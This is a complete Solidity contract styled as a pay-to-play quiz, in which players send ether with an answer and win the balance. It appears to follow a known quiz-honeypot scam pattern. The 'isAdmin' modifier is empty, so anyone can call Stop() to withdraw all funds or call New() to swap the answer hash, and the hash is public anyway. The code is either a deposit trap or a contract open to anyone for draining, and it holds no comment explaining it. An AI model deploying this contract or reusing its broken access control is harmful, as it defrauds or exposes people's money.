 

 

pragma solidity ^0.4.25;

contract play_IQUIZ
{
    function Try(string _response) external payable 
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 0.00001 ether)
        {
            msg.sender.transfer(this.balance);
            
            question = "";
            
        }
    }

    string public question;

    bytes32 public responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string _question, string _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() public{
    }

    modifier isAdmin(){
        _;
    }

    function() public payable{}
}